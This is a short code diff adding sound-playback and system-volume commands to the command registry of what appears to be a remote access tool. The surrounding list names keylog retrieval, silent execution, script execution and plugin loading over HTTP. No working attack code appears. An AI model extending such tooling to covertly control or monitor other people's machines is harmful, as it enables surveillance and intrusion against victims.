@@ -227,6 +227,7 @@ export const COMMAND_TYPES = [
   "keylog_retrieve",
   "message_box",
   "open_url",
+  "play_sound",
   "plugin_load",
   "plugin_load_http",
   "plugin_unload",
@@ -246,6 +247,8 @@ export const COMMAND_TYPES = [
   "script_exec",
   "set_wallpaper",
   "silent_exec",
+  "stop_sound",
+  "system_volume",
   "uninstall",
   "virtual_enable_cursor",
   "virtual_enable_keyboard",
@@ -652,6 +655,10 @@ export const COMMAND_VERSION_SUPPORT = {
     "min": 1,
     "max": 1
   },
+  "play_sound": {
+    "min": 1,
+    "max": 1
+  },
   "plugin_load": {
     "min": 1,
     "max": 1
@@ -725,6 +732,14 @@ export const COMMAND_VERSION_SUPPORT = {
     "max": 1
   },
   "silent_exec": {
+    "min": 1,
+    "max": 1
+  },
+  "stop_sound": {
+    "min": 1,
+    "max": 1
+  },
+  "system_volume": {
     "min": 1,
     "max": 1
   },
